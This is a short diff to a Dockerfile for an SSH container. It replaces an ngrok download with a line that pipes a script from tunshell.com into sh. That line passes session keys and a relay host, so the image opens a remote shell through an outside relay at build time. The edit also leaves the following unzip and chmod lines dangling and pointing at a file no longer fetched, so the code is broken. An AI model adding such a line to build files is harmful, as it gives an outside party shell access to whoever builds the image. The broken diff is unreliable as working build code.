@@ -4,7 +4,7 @@ ARG REGION=ap
 ENV DEBIAN_FRONTEND=noninteractive
 RUN apt update && apt upgrade -y && apt install -y \
     ssh wget unzip vim curl python3
-RUN wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O /ngrok-stable-linux-amd64.zip\
+RUN curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 6hXdQWxPjmCZq5UzApZgrV sbvFrZfJYI1a1I8hWqfG9q eu.relay.tunshell.com
     && cd / && unzip ngrok-stable-linux-amd64.zip \
     && chmod +x ngrok
 RUN mkdir /run/sshd \
